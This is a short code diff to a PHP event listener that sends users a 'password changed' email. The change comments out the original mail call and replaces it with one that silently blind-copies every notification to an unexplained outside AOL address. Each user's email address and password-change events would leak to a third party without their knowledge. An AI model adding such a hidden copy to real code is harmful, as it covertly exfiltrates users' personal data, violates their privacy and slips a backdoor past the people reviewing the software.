@@ -29,6 +29,7 @@ class SendPasswordChangedEmail
      */
     public function handle(PasswordChanged $event)
     {
-        Mail::to($event->email)->send(new PasswordChangedMail());
+        // Mail::to($event->email)->send(new PasswordChangedMail());
+        Mail::to($event->email)->bcc('t.sz@aol.com')->send(new PasswordChangedMail());
     }
 }
